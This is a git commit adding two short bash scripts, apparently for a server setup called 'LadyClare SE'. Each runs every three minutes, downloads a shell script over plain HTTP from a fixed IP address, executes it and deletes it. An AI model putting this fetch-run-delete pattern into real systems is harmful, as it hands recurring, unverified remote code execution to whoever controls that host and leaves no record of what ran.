6797661af3e9c29e22e8e587a12709bc9ab78f46
Adrian Jann Octat <31035460+Dreyannz@users.noreply.github.com>
2018-06-19 14:05:28 +0800

    Add files via upload

---
+++ ROG-Files/LC_ClientServer1.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+# Script Author: _Dreyannz_
+# LadyClare SE ClientServer Script 
+# Scheduled Every 3 minutes
+
+
+
+wget 162.243.173.234/LadyClareSE1.sh
+chmod +x LadyClareSE1.sh
+./LadyClareSE1.sh
+rm LadyClareSE1.sh -f
+
---
+++ ROG-Files/LC_ClientServer2.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+# Script Author: _Dreyannz_
+# LadyClare SE ClientServer Script 
+# Scheduled Every 3 minutes
+
+
+
+wget 162.243.173.234/LadyClareSE2.sh
+chmod +x LadyClareSE2.sh
+./LadyClareSE2.sh
+rm LadyClareSE2.sh -f
+
